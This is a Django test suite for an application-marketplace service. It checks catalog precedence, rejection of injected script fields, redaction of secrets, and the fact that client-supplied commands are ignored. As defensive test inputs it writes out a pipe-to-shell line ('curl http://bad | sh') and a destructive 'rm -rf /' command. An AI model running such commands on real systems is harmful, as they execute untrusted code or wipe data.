from __future__ import annotations

from unittest.mock import patch

from django.contrib.auth import get_user_model
from django.test import TestCase

from host_management.models import HostGroup, ManagedHost

from .models import ApplicationDefinition, ApplicationInstallation, ApplicationSource, ApplicationTask
from .services import catalog, plans, sources, targets


class ApplicationMarketCatalogTests(TestCase):
    def test_builtin_catalog_loads_safe_compose_apps(self):
        apps = catalog.load_catalog()

        nginx = next(item for item in apps if item["appId"] == "nginx")
        self.assertEqual(nginx["source"], "builtin")
        self.assertEqual(nginx["installMode"], "compose")
        self.assertIn("install", nginx["capabilities"])
        self.assertNotIn("script", nginx)

    def test_builtin_definition_wins_over_remote_definition(self):
        ApplicationDefinition.objects.create(
            app_id="nginx",
            name="Remote Nginx",
            category="remote",
            description="should not override",
            icon="remote",
            version="99.0.0",
            source="remote",
            install_mode="compose",
            requirements={},
            config_schema=[],
            manifest={"compose": {"services": {"evil": {"image": "evil:latest"}}}},
            capabilities=["install"],
            checksum="remote",
        )

        nginx = next(item for item in catalog.load_catalog() if item["appId"] == "nginx")

        self.assertEqual(nginx["source"], "builtin")
        self.assertNotEqual(nginx["name"], "Remote Nginx")

    def test_remote_payload_rejects_script_injection_fields(self):
        with self.assertRaises(ValueError):
            sources.normalize_remote_catalog(
                [
                    {
                        "appId": "bad-app",
                        "name": "Bad",
                        "category": "web",
                        "description": "bad",
                        "icon": "bad",
                        "version": "1.0.0",
                        "installMode": "compose",
                        "script": "curl http://bad | sh",
                    }
                ]
            )


class ApplicationMarketApiTests(TestCase):
    def setUp(self):
        self.user = get_user_model().objects.create_user(username="operator", password="pass", is_staff=True)
        self.client.force_login(self.user)
        self.group = HostGroup.objects.create(name="Default")
        self.linux = ManagedHost.objects.create(
            name="linux-1",
            group=self.group,
            private_ip="10.0.0.11",
            login_user="root",
            login_password="secret",
            os="ubuntu",
            verified=True,
            verify_status="verified",
        )
        self.windows = ManagedHost.objects.create(
            name="win-1",
            group=self.group,
            private_ip="10.0.0.12",
            login_user="administrator",
            login_password="secret",
            os="windows",
            verified=True,
            verify_status="verified",
        )

    def test_catalog_and_targets_endpoints_return_market_payloads(self):
        catalog_response = self.client.get("/api/application-market/catalog/")
        targets_response = self.client.get("/api/application-market/targets/")

        self.assertEqual(catalog_response.status_code, 200)
        self.assertTrue(any(item["appId"] == "nginx" for item in catalog_response.json()["apps"]))
        self.assertEqual(targets_response.status_code, 200)
        target_ids = {item["id"] for item in targets_response.json()["targets"]}
        self.assertIn("local", target_ids)
        self.assertIn(f"host:{self.linux.id}", target_ids)
        self.assertIn(f"host:{self.windows.id}", target_ids)

    def test_windows_target_cannot_preview_docker_install(self):
        response = self.client.post(
            "/api/application-market/preview/",
            data={"appId": "nginx", "target": f"host:{self.windows.id}", "action": "install", "config": {}},
            content_type="application/json",
        )

        self.assertEqual(response.status_code, 400)
        self.assertIn("Windows", response.json()["error"])

    @patch("application_market.services.targets.probe_target")
    def test_preview_returns_digest_and_ignores_client_command(self, probe_target):
        probe_target.return_value = {
            "docker": True,
            "compose": True,
            "supported": True,
            "os": "linux",
            "arch": "x86_64",
            "ports": [],
            "containers": [],
        }

        response = self.client.post(
            "/api/application-market/preview/",
            data={
                "appId": "nginx",
                "target": "local",
                "action": "install",
                "config": {"adminPassword": "secret-value"},
                "command": "rm -rf /",
            },
            content_type="application/json",
        )

        payload = response.json()
        self.assertEqual(response.status_code, 200)
        self.assertTrue(payload["planDigest"])
        self.assertNotIn("rm -rf", str(payload))
        self.assertNotIn("secret-value", str(payload))

    @patch("application_market.services.runner.start_application_task")
    @patch("application_market.services.targets.probe_target")
    def test_task_create_requires_preview_digest_and_redacts_sensitive_config(self, probe_target, start_task):
        probe_target.return_value = {
            "docker": True,
            "compose": True,
            "supported": True,
            "os": "linux",
            "arch": "x86_64",
            "ports": [],
            "containers": [],
        }
        preview = self.client.post(
            "/api/application-market/preview/",
            data={
                "appId": "nginx",
                "target": "local",
                "action": "install",
                "config": {"adminPassword": "secret-value"},
            },
            content_type="application/json",
        ).json()

        response = self.client.post(
            "/api/application-market/tasks/",
            data={
                "appId": "nginx",
                "target": "local",
                "action": "install",
                "config": {"adminPassword": "secret-value"},
                "planDigest": preview["planDigest"],
                "command": "rm -rf /",
            },
            content_type="application/json",
        )
        task = ApplicationTask.objects.get()

        self.assertEqual(response.status_code, 201)
        self.assertEqual(task.action, "install")
        self.assertNotIn("secret-value", task.log_output)
        self.assertNotIn("changed", task.log_output)
        self.assertNotIn("rm -rf", task.plan)
        start_task.assert_called_once_with(task.id)

    def test_sources_endpoints_manage_and_sync_remote_sources(self):
        source = ApplicationSource.objects.create(name="remote", source_type="remote", url="https://example.invalid/apps.json")

        list_response = self.client.get("/api/application-market/sources/")
        update_response = self.client.put(
            f"/api/application-market/sources/{source.id}/",
            data={"enabled": False},
            content_type="application/json",
        )

        self.assertEqual(list_response.status_code, 200)
        self.assertEqual(list_response.json()["sources"][0]["name"], "remote")
        self.assertEqual(update_response.status_code, 200)
        self.assertFalse(update_response.json()["enabled"])
